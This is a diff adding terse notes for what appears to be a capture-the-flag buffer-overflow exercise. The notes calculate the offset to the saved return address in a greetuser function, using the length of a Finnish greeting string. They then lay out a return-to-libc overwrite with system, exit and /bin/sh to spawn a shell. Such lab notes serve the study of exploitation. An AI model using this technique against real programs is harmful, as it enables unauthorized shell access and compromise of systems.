@@ -1,0 +1,16 @@
+
+
+buffer[88]: goal + 88 + 4  => buffer +  92 : eip of greetuser
+
+fi as LANG => g_language = 1
+
+strcpy(buffer + 16, "Hyvää päivää "); => strlen("Hyvää päivää ") = 18
+
+
+16 + ("Hyvää päivää " = 18) = 34
+34 + 40 = 74
+74 + 18 = 92 :
+	replace 92 -> 96 bytes by system
+	replace 96 -> 100 bytes by exit
+	replace 100 -> 104 bytes by /bin/sh
+
